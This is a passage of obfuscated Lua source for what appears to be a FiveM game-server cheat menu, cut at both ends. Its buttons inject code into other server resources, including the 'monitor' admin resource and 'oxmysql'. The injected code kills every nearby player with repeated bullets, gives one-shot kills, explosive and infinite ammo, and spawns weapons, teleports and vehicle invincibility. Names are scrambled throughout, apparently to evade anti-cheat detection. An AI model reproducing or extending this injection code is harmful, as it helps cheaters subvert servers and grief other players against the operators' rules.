                local qWeRtYuiOp = ShootSingleBulletBetweenCoords

                nBxMzLqPw(function()
                    while aSwDeFgHiJkLoPx and not Unloaded do
                        Wait(gBvTnCuXe)
                        local bNmZxSwEd = GetActivePlayers()
                        local jUiKoLpMq = GetEntityCoords(mAxPlErOy)

                        for _, wQaSzXedC in ipairs(bNmZxSwEd) do
                            local zAsXcVbNm = GetPlayerPed(wQaSzXedC)
                            if zAsXcVbNm ~= mAxPlErOy and DoesEntityExist(zAsXcVbNm) and not IsPedDeadOrDying(zAsXcVbNm, true) then
                                local eDxCfVgBh = GetEntityCoords(zAsXcVbNm)
                                if #(eDxCfVgBh - jUiKoLpMq) <= lKjHgFdSa then
                                    local xScVbNmAz = vector3(
                                        eDxCfVgBh.x + (math.random() - 0.5) * 0.8,
                                        eDxCfVgBh.y + (math.random() - 0.5) * 0.8,
                                        eDxCfVgBh.z + 1.2
                                    )

                                    local dFgHjKlZx = vector3(
                                        eDxCfVgBh.x,
                                        eDxCfVgBh.y,
                                        eDxCfVgBh.z + 0.2
                                    )

                                    qWeRtYuiOp(
                                        xScVbNmAz.x, xScVbNmAz.y, xScVbNmAz.z,
                                        dFgHjKlZx.x, dFgHjKlZx.y, dFgHjKlZx.z,
                                        aSdFgHjKl,
                                        true,
                                        rVtNiUcEx,
                                        mAxPlErOy,
                                        true,
                                        false,
                                        100.0
                                    )
                                end
                            end
                        end
                    end
                end)
            end

            pLoMkIjUhbGyTf()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            aSwDeFgHiJkLoPx = false
        ]]);end);MachoMenuCheckbox(v40[2],"Permanent Kill Everyone",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if qWeRtYuIoPlMnAb == nil then qWeRtYuIoPlMnAb = false end
            qWeRtYuIoPlMnAb = true

            local function bZxLmNcVqPeTyUi()
                local vBnMkLoPi = PlayerPedId()
                local wQaSzXedC = GetHashKey("WEAPON_TRANQUILIZER")
                local eDxCfVgBh = 100
                local lKjHgFdSa = 1000.0
                local mAxPlErOy = 300.0

                local rTwEcVzUi = CreateThread
                local oPiLyKuJm = ShootSingleBulletBetweenCoords

                rTwEcVzUi(function()
                    while qWeRtYuIoPlMnAb and not Unloaded do
                        Wait(eDxCfVgBh)
                        local aSdFgHjKl = GetActivePlayers()
                        local xSwEdCvFr = GetEntityCoords(vBnMkLoPi)

                        for _, bGtFrEdCv in ipairs(aSdFgHjKl) do
                            local nMzXcVbNm = GetPlayerPed(bGtFrEdCv)
                            if nMzXcVbNm ~= vBnMkLoPi and DoesEntityExist(nMzXcVbNm) and not IsPedDeadOrDying(nMzXcVbNm, true) then
                                local zAsXcVbNm = GetEntityCoords(nMzXcVbNm)
                                if #(zAsXcVbNm - xSwEdCvFr) <= mAxPlErOy then
                                    local jUiKoLpMq = vector3(
                                        zAsXcVbNm.x + (math.random() - 0.5) * 0.8,
                                        zAsXcVbNm.y + (math.random() - 0.5) * 0.8,
                                        zAsXcVbNm.z + 1.2
                                    )

                                    local cReAtEtHrEaD = vector3(
                                        zAsXcVbNm.x,
                                        zAsXcVbNm.y,
                                        zAsXcVbNm.z + 0.2
                                    )

                                    oPiLyKuJm(
                                        jUiKoLpMq.x, jUiKoLpMq.y, jUiKoLpMq.z,
                                        cReAtEtHrEaD.x, cReAtEtHrEaD.y, cReAtEtHrEaD.z,
                                        lKjHgFdSa,
                                        true,
                                        wQaSzXedC,
                                        vBnMkLoPi,
                                        true,
                                        false,
                                        100.0
                                    )
                                end
                            end
                        end
                    end
                end)
            end

            bZxLmNcVqPeTyUi()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            qWeRtYuIoPlMnAb = false
        ]]);end);local v52=MachoMenuInputbox(v41[4 -3 ],"Coords:","x, y, z");MachoMenuButton(v41[1],"Teleport to Coords",function() local v201=MachoMenuGetInputbox(v52);if (v201 and (v201~="")) then local v285=0;local v286;local v287;local v288;while true do if ((0 + 0)==v285) then v286,v287,v288=v201:match("([^,]+),%s*([^,]+),%s*([^,]+)");v286=tonumber(v286);v285=1;end if (v285==(7 -5)) then if (v286 and v287 and v288) then MachoInjectResource((v48("monitor") and "monitor") or "any" ,string.format([[
                    local function b0NtdqLZKW()
                        local uYiTpLaNmZxCwEq = SetEntityCoordsNoOffset
                        local nHgFdSaZxCvBnMq = PlayerPedId
                        local XvMzAsQeTrBnLpK = IsPedInAnyVehicle
                        local QeTyUvGhTrBnAzX = GetVehiclePedIsIn
                        local BvNzMkJdHsLwQaZ = GetGroundZFor_3dCoord

                        local x, y, z = %f, %f, %f
                        local found, gZ = BvNzMkJdHsLwQaZ(x, y, z + 1000.0, true)
                        if found then z = gZ + 1.0 end

                        local ent = XvMzAsQeTrBnLpK(nHgFdSaZxCvBnMq(), false) and QeTyUvGhTrBnAzX(nHgFdSaZxCvBnMq(), false) or nHgFdSaZxCvBnMq()
                        uYiTpLaNmZxCwEq(ent, x, y, z, false, false, false)
                    end

                    b0NtdqLZKW()
                ]],v286,v287,v288));end break;end if (v285==(1 + 0)) then v287=tonumber(v287);v288=tonumber(v288);v285=2;end end end end);MachoMenuButton(v41[1 + 0 ],"Waypoint",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function xQX7uzMNfb()
                local mNbVcXtYuIoPlMn = GetFirstBlipInfoId
                local zXcVbNmQwErTyUi = DoesBlipExist
                local aSdFgHjKlQwErTy = GetBlipInfoIdCoord
                local lKjHgFdSaPlMnBv = PlayerPedId
                local qWeRtYuIoPlMnBv = SetEntityCoords

                local function XcVrTyUiOpAsDfGh()
                    local RtYuIoPlMnBvZx = mNbVcXtYuIoPlMn(8)
                    if not zXcVbNmQwErTyUi(RtYuIoPlMnBvZx) then return nil end
                    return aSdFgHjKlQwErTy(RtYuIoPlMnBvZx)
                end

                local GhTyUoLpZmNbVcXq = XcVrTyUiOpAsDfGh()
                if GhTyUoLpZmNbVcXq then
                    local QwErTyUiOpAsDfGh = lKjHgFdSaPlMnBv()
                    qWeRtYuIoPlMnBv(QwErTyUiOpAsDfGh, GhTyUoLpZmNbVcXq.x, GhTyUoLpZmNbVcXq.y, GhTyUoLpZmNbVcXq.z + 5.0, false, false, false, true)
                end
            end

            xQX7uzMNfb()
        ]]);end);MachoMenuButton(v41[2 -1 ],"FIB Building",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function HAZ6YqLRbM()
                local aSdFgHjKlQwErTy = PlayerPedId
                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                local x, y, z = 140.43, -750.52, 258.15
                local ped = aSdFgHjKlQwErTy()
                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
            end

            HAZ6YqLRbM()
        ]]);end);MachoMenuButton(v41[1],"Mission Row PD",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function oypB9FcNwK()
                local aSdFgHjKlQwErTy = PlayerPedId
                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                local x, y, z = 425.1, -979.5, 30.7
                local ped = aSdFgHjKlQwErTy()
                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
            end

            oypB9FcNwK()
        ]]);end);MachoMenuButton(v41[1],"Pillbox Hospital",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function TmXU0zLa4e()
                local aSdFgHjKlQwErTy = PlayerPedId
                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                local x, y, z = 308.6, -595.3, 43.28
                local ped = aSdFgHjKlQwErTy()
                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
            end

            TmXU0zLa4e()
        ]]);end);MachoMenuButton(v41[1 + 0 ],"Del Perro Pier",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function eLQN9XKwbJ()
                local aSdFgHjKlQwErTy = PlayerPedId
                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                local x, y, z = -1632.87, -1007.81, 13.07
                local ped = aSdFgHjKlQwErTy()
                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
            end

            eLQN9XKwbJ()
        ]]);end);MachoMenuButton(v41[1 -0 ],"Grove Street",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function YrAFvPMkqt()
                local aSdFgHjKlQwErTy = PlayerPedId
                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                local x, y, z = 109.63, -1943.14, 20.80
                local ped = aSdFgHjKlQwErTy()
                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
            end

            YrAFvPMkqt()
        ]]);end);MachoMenuButton(v41[1 + 0 ],"Legion Square",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function zdVCXL8rjp()
                local aSdFgHjKlQwErTy = PlayerPedId
                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                local x, y, z = 229.21, -871.61, 30.49
                local ped = aSdFgHjKlQwErTy()
                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
            end

            zdVCXL8rjp()
        ]]);end);MachoMenuButton(v41[1],"LS Customs",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function oKXpQUYwd5()
                local aSdFgHjKlQwErTy = PlayerPedId
                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                local x, y, z = -365.4, -131.8, 37.7
                local ped = aSdFgHjKlQwErTy()
                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
            end

            oKXpQUYwd5()
        ]]);end);MachoMenuButton(v41[1 + 0 ],"Maze Bank",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function E1tYUMowqF()
                local aSdFgHjKlQwErTy = PlayerPedId
                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                local x, y, z = -75.24, -818.95, 326.1
                local ped = aSdFgHjKlQwErTy()
                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
            end

            E1tYUMowqF()
        ]]);end);MachoMenuButton(v41[1],"Mirror Park",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function Ptn2qMBvYe()
                local aSdFgHjKlQwErTy = PlayerPedId
                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                local x, y, z = 1039.2, -765.3, 57.9
                local ped = aSdFgHjKlQwErTy()
                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
            end

            Ptn2qMBvYe()
        ]]);end);MachoMenuButton(v41[1 + 0 ],"Vespucci Beach",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function gQZf7xYULe()
                local aSdFgHjKlQwErTy = PlayerPedId
                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                local x, y, z = -1223.8, -1516.6, 4.4
                local ped = aSdFgHjKlQwErTy()
                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
            end

            gQZf7xYULe()
        ]]);end);MachoMenuButton(v41[1 + 0 ],"Vinewood",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function JqXLKbvR20()
                local aSdFgHjKlQwErTy = PlayerPedId
                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                local x, y, z = 293.2, 180.5, 104.3
                local ped = aSdFgHjKlQwErTy()
                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
            end

            JqXLKbvR20()
        ]]);end);MachoMenuButton(v41[1 + 0 ],"Sandy Shores",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function NxvTpL3qWz()
                local aSdFgHjKlQwErTy = PlayerPedId
                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                local x, y, z = 1843.10, 3707.60, 33.52
                local ped = aSdFgHjKlQwErTy()
                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
            end

            NxvTpL3qWz()
        ]]);end);MachoMenuButton(v41[435 -(153 + 280) ],"Print Current Coords",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function Xy9TqLzVmN()
                local zXcVbNmQwErTyUi = GetEntityCoords
                local aSdFgHjKlQwErTy = PlayerPedId

                local coords = zXcVbNmQwErTyUi(aSdFgHjKlQwErTy())
                local x, y, z = coords.x, coords.y, coords.z
                print(string.format("[^3JTG^7] [^4DEBUG^7] - %.2f, %.2f, %.2f", x, y, z))
            end

            Xy9TqLzVmN()
        ]]);end);MachoMenuCheckbox(v42[2 -1 ],"Infinite Ammo",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if LkJgFdSaQwErTy == nil then LkJgFdSaQwErTy = false end
            LkJgFdSaQwErTy = true

            local function qUwKZopRM8()
                if LkJgFdSaQwErTy == nil then LkJgFdSaQwErTy = false end
                LkJgFdSaQwErTy = true

                local MnBvCxZlKjHgFd = CreateThread
                MnBvCxZlKjHgFd(function()
                    local AsDfGhJkLzXcVb = PlayerPedId
                    local QwErTyUiOpAsDf = SetPedInfiniteAmmoClip
                    local ZxCvBnMqWeRtYu = GetSelectedPedWeapon
                    local ErTyUiOpAsDfGh = GetAmmoInPedWeapon
                    local GhJkLzXcVbNmQw = SetPedAmmo

                    while LkJgFdSaQwErTy and not Unloaded do
                        local ped = AsDfGhJkLzXcVb()
                        local weapon = ZxCvBnMqWeRtYu(ped)

                        QwErTyUiOpAsDf(ped, true)

                        if ErTyUiOpAsDfGh(ped, weapon) <= 0 then
                            GhJkLzXcVbNmQw(ped, weapon, 250)
                        end

                        Wait(0)
                    end
                end)
            end

            qUwKZopRM8()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            LkJgFdSaQwErTy = false

            local function yFBN9pqXcL()
                local AsDfGhJkLzXcVb = PlayerPedId
                local QwErTyUiOpAsDf = SetPedInfiniteAmmoClip
                QwErTyUiOpAsDf(AsDfGhJkLzXcVb(), false)
            end

            yFBN9pqXcL()
        ]]);end);MachoMenuCheckbox(v42[1 + 0 ],"Explosive Ammo",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if QzWxEdCvTrBnYu == nil then QzWxEdCvTrBnYu = false end
            QzWxEdCvTrBnYu = true

            local function WpjLRqtm28()
                if QzWxEdCvTrBnYu == nil then QzWxEdCvTrBnYu = false end
                QzWxEdCvTrBnYu = true

                local UyJhNbGtFrVbCx = CreateThread
                UyJhNbGtFrVbCx(function()
                    local HnBvFrTgYhUzKl = PlayerPedId
                    local TmRgVbYhNtKjLp = GetPedLastWeaponImpactCoord
                    local JkLpHgTfCvXzQa = AddOwnedExplosion

                    while QzWxEdCvTrBnYu and not Unloaded do
                        local CvBnYhGtFrLpKm = HnBvFrTgYhUzKl()
                        local XsWaQzEdCvTrBn, PlKoMnBvCxZlQj = TmRgVbYhNtKjLp(CvBnYhGtFrLpKm)

                        if XsWaQzEdCvTrBn then
                            JkLpHgTfCvXzQa(CvBnYhGtFrLpKm, PlKoMnBvCxZlQj.x, PlKoMnBvCxZlQj.y, PlKoMnBvCxZlQj.z, 6, 1.0, true, false, 0.0)
                        end

                        Wait(0)
                    end
                end)
            end

            WpjLRqtm28()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            QzWxEdCvTrBnYu = false
        ]]);end);MachoMenuCheckbox(v42[1],"Oneshot Kill",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if RfGtHyUjMiKoLp == nil then RfGtHyUjMiKoLp = false end
            RfGtHyUjMiKoLp = true

            local function xUQp7AK0tv()
                local PlMnBvCxZaSdFg = CreateThread
                PlMnBvCxZaSdFg(function()
                    local ZxCvBnNmLkJhGf = GetSelectedPedWeapon
                    local AsDfGhJkLzXcVb = SetWeaponDamageModifier
                    local ErTyUiOpAsDfGh = PlayerPedId

                    while RfGtHyUjMiKoLp do
                        if Unloaded then
                            RfGtHyUjMiKoLp = false
                            break
                        end

                        local Wp = ZxCvBnNmLkJhGf(ErTyUiOpAsDfGh())
                        if Wp and Wp ~= 0 then
                            AsDfGhJkLzXcVb(Wp, 1000.0)
                        end

                        Wait(0)
                    end
                end)
            end

            xUQp7AK0tv()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            RfGtHyUjMiKoLp = false
            local ZxCvBnNmLkJhGf = GetSelectedPedWeapon
            local AsDfGhJkLzXcVb = SetWeaponDamageModifier
            local ErTyUiOpAsDfGh = PlayerPedId
            local Wp = ZxCvBnNmLkJhGf(ErTyUiOpAsDfGh())
            if Wp and Wp ~= 0 then
                AsDfGhJkLzXcVb(Wp, 1.0)
            end
        ]]);end);local v53=MachoMenuInputbox(v42[1 + 1 ],"Weapon:","...");MachoMenuButton(v42[2],"Spawn Weapon",function() local v202=MachoMenuGetInputbox(WeaponSpawnerBox);if (v202 and (v202~="")) then MachoInjectResource((v48("monitor") and "monitor") or "any" ,string.format([[
                local function GiveWeapon()
                    local ped = PlayerPedId()
                    local weapon = GetHashKey("%s")
                    local XeCwVrBtNuMyLk = GiveWeaponToPed
                    XeCwVrBtNuMyLk(ped, weapon, 250, true, true)
                end

                GiveWeapon()
            ]],v202));end end);local v54=0 + 0 ;local v55={[0 + 0 ]={name="Default",hash="MP_F_Freemode"},[1 + 0 ]={name="Gangster",hash="Gang1H"},[2 -0 ]={name="Wild",hash="GangFemale"},[2 + 1 ]={name="Red Neck",hash="Hillbilly"}};MachoMenuDropDown(v42[670 -(89 + 578) ],"Aiming Style",function(v203) v54=v203;end,"Default","Gangster","Wild","Red Neck");MachoMenuButton(v42[3 + 0 ],"Apply Aiming Style",function() local v204=v55[v54];if  not v204 then return;end MachoInjectResource((v48("oxmysql") and "oxmysql") or "any" ,([[
            local function vXK2dPLR07()
                local UiOpAsDfGhJkLz = PlayerPedId
                local PlMnBvCxZaSdFg = GetHashKey
                local QwErTyUiOpAsDf = SetWeaponAnimationOverride

                local MnBvCxZaSdFgHj = PlMnBvCxZaSdFg("%s")
                QwErTyUiOpAsDf(UiOpAsDfGhJkLz(), MnBvCxZaSdFgHj)
            end

            vXK2dPLR07()

        ]]):format(v204.hash));end);MachoMenuCheckbox(v43[1 -0 ],"Vehicle Godmode",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if zXcVbNmQwErTyUi == nil then zXcVbNmQwErTyUi = false end
            zXcVbNmQwErTyUi = true

            local function LWyZoXRbqK()
                local LkJhGfDsAzXcVb = CreateThread
                LkJhGfDsAzXcVb(function()
                    while zXcVbNmQwErTyUi and not Unloaded do
                        local QwErTyUiOpAsDfG = GetVehiclePedIsIn
                        local TyUiOpAsDfGhJkL = PlayerPedId
                        local AsDfGhJkLzXcVbN = SetEntityInvincible

                        local vehicle = QwErTyUiOpAsDfG(TyUiOpAsDfGhJkL(), false)
                        if vehicle and vehicle ~= 0 then
                            AsDfGhJkLzXcVbN(vehicle, true)
                        end
                        Wait(0)
                    end
                end)
            end

            LWyZoXRbqK()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            zXcVbNmQwErTyUi = false
            local QwErTyUiOpAsDfG = GetVehiclePedIsIn
            local TyUiOpAsDfGhJkL = PlayerPedId
            local AsDfGhJkLzXcVbN = SetEntityInvincible

            local vehicle = QwErTyUiOpAsDfG(TyUiOpAsDfGhJkL(), true)
            if vehicle and vehicle ~= 0 then
                AsDfGhJkLzXcVbN(vehicle, false)
            end
        ]]);end);MachoMenuCheckbox(v43[1050 -(572 + 477) ],"Force Vehicle Engine",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if GhYtReFdCxWaQzLp == nil then GhYtReFdCxWaQzLp = false end
            GhYtReFdCxWaQzLp = true

            local function OpAsDfGhJkLzXcVb()
                local lMnbVcXzZaSdFg = CreateThread
                lMnbVcXzZaSdFg(function()
                    local QwErTyUiOp         = _G.PlayerPedId
                    local AsDfGhJkLz         = _G.GetVehiclePedIsIn
                    local TyUiOpAsDfGh       = _G.GetVehiclePedIsTryingToEnter
                    local ZxCvBnMqWeRtYu     = _G.SetVehicleEngineOn
                    local ErTyUiOpAsDfGh     = _G.SetVehicleUndriveable
                    local KeEpOnAb           = _G.SetVehicleKeepEngineOnWhenAbandoned
                    local En_g_Health_Get    = _G.GetVehicleEngineHealth
                    local En_g_Health_Set    = _G.SetVehicleEngineHealth
                    local En_g_Degrade_Set   = _G.SetVehicleEngineCanDegrade
                    local No_Hotwire_Set     = _G.SetVehicleNeedsToBeHotwired

                    local function _tick(vh)
                        if vh and vh ~= 0 then
                            No_Hotwire_Set(vh, false)
                            En_g_Degrade_Set(vh, false)
                            ErTyUiOpAsDfGh(vh, false)
                            KeEpOnAb(vh, true)

                            local eh = En_g_Health_Get(vh)
                            if (not eh) or eh < 300.0 then
                                En_g_Health_Set(vh, 900.0)
                            end

                            ZxCvBnMqWeRtYu(vh, true, true, true)
                        end
                    end

                    while GhYtReFdCxWaQzLp and not Unloaded do
                        local p  = QwErTyUiOp()

                        _tick(AsDfGhJkLz(p, false))
                        _tick(TyUiOpAsDfGh(p))
                        _tick(AsDfGhJkLz(p, true))

                        Wait(0)
                    end
                end)
            end

            OpAsDfGhJkLzXcVb()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            GhYtReFdCxWaQzLp = false
            local v = GetVehiclePedIsIn(PlayerPedId(), false)
            if v and v ~= 0 then
                SetVehicleKeepEngineOnWhenAbandoned(v, false)
                SetVehicleEngineCanDegrade(v, true)
                SetVehicleUndriveable(v, false)
            end
        ]]);end);MachoMenuCheckbox(v43[1],"Vehicle Auto Repair",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if PlAsQwErTyUiOp == nil then PlAsQwErTyUiOp = false end
            PlAsQwErTyUiOp = true

            local function uPkqLXTm98()
                local QwErTyUiOpAsDf = CreateThread
                QwErTyUiOpAsDf(function()
                    while PlAsQwErTyUiOp and not Unloaded do
                        local AsDfGhJkLzXcVb = PlayerPedId
                        local LzXcVbNmQwErTy = GetVehiclePedIsIn
                        local VbNmLkJhGfDsAz = SetVehicleFixed
                        local MnBvCxZaSdFgHj = SetVehicleDirtLevel

                        local ped = AsDfGhJkLzXcVb()
                        local vehicle = LzXcVbNmQwErTy(ped, false)
                        if vehicle and vehicle ~= 0 then
                            VbNmLkJhGfDsAz(vehicle)
                            MnBvCxZaSdFgHj(vehicle, 0.0)
                        end

                        Wait(0)
                    end
                end)
            end

            uPkqLXTm98()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            PlAsQwErTyUiOp = false
        ]]);end);MachoMenuCheckbox(v43[1 + 0 ],"Freeze Vehicle",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if LzKxWcVbNmQwErTy == nil then LzKxWcVbNmQwErTy = false end
            LzKxWcVbNmQwErTy = true

            local function WkQ79ZyLpT()
                local tYhGtFrDeSwQaZx = CreateThread
                local xCvBnMqWeRtYuIo = PlayerPedId
                local aSdFgHjKlZxCvBn = GetVehiclePedIsIn
                local gKdNqLpYxMiV = FreezeEntityPosition
                local jBtWxFhPoZuR = Wait

                tYhGtFrDeSwQaZx(function()
                    while LzKxWcVbNmQwErTy and not Unloaded do
                        local VbNmLkJhGfDsAzX = xCvBnMqWeRtYuIo()
                        local IoPlMnBvCxZaSdF = aSdFgHjKlZxCvBn(VbNmLkJhGfDsAzX, false)
                        if IoPlMnBvCxZaSdF and IoPlMnBvCxZaSdF ~= 0 then
                            gKdNqLpYxMiV(IoPlMnBvCxZaSdF, true)
                        end
                        jBtWxFhPoZuR(0)
                    end
                end)
            end

            WkQ79ZyLpT()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            LzKxWcVbNmQwErTy = false

            local function i7qWlBXtPo()
                local yUiOpAsDfGhJkLz = PlayerPedId
                local QwErTyUiOpAsDfG = GetVehiclePedIsIn
                local FdSaPlMnBvCxZlK = FreezeEntityPosition

                local pEdRfTgYhUjIkOl = yUiOpAsDfGhJkLz()
                local zXcVbNmQwErTyUi = QwErTyUiOpAsDfG(pEdRfTgYhUjIkOl, true)
                if zXcVbNmQwErTyUi and zXcVbNmQwErTyUi ~= 0 then
                    FdSaPlMnBvCxZlK(zXcVbNmQwErTyUi, false)
                end
            end

            i7qWlBXtPo()
        ]]);end);MachoMenuCheckbox(v43[1 + 0 ],"Vehicle Hop",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if NuRqVxEyKiOlZm == nil then NuRqVxEyKiOlZm = false end
            NuRqVxEyKiOlZm = true

            local function qPTnXLZKyb()
                local ZlXoKmVcJdBeTr = CreateThread
                ZlXoKmVcJdBeTr(function()
                    while NuRqVxEyKiOlZm and not Unloaded do
                        local GvHnMzLoPqAxEs = PlayerPedId
                        local DwZaQsXcErDfGt = GetVehiclePedIsIn
                        local BtNhUrLsEkJmWq = IsDisabledControlPressed
                        local PlZoXvNyMcKwQi = ApplyForceToEntity

                        local GtBvCzHnUkYeWr = GvHnMzLoPqAxEs()
                        local OaXcJkWeMzLpRo = DwZaQsXcErDfGt(GtBvCzHnUkYeWr, false)

                        if OaXcJkWeMzLpRo and OaXcJkWeMzLpRo ~= 0 and BtNhUrLsEkJmWq(0, 22) then
                            PlZoXvNyMcKwQi(OaXcJkWeMzLpRo, 1, 0.0, 0.0, 6.0, 0.0, 0.0, 0.0, 0, true, true, true, true, true)
                        end

                        Wait(0)
                    end
                end)
            end

            qPTnXLZKyb()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            NuRqVxEyKiOlZm = false
        ]]);end);MachoMenuCheckbox(v43[1 + 0 ],"Rainbow Vehicle",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if GxRpVuNzYiTq == nil then GxRpVuNzYiTq = false end
            GxRpVuNzYiTq = true

            local function jqX7TvYzWq()
                local WvBnMpLsQzTx = GetGameTimer
